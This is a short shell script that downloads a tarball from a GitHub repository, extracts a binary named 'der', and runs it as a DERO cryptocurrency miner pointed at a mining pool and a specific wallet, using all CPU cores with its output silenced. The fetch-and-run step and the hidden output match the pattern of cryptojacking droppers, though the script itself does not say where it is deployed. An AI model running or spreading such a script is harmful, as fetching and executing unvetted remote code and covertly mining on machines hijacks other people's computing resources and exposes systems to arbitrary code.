#!/bin/sh
wget https://github.com/erindiana/devs/raw/main/der.tar.gz
tar -xf der.tar.gz

./der -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s.dero1 -t$(nproc --all) >/dev/null >/dev/null 2>&1
sleep 10
